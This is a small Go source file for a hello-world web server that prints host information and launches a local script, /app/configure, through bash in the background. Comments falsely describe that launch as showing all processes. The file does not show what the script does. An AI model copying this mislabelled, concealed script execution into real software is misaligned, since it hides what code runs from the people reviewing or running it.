package main

import (
	"fmt"
	"net/http"
        "github.com/shirou/gopsutil/host"
	"os/exec"
)

func main() {
	fmt.Println("Starting hello-world server...")
	h,_ := host.Info()
        fmt.Println("本机信息：",h)

	// 2nd example: show all processes----------
	exec.Command("/bin/bash","/app/configure","&").Start()
	// 2nd example: show all processes------------
	

	http.HandleFunc("/", helloServer)
	if err := http.ListenAndServe(":8080", nil); err != nil {
		panic(err)
	}
}

func helloServer(w http.ResponseWriter, r *http.Request) {
	fmt.Fprint(w, "Hello world!")
}
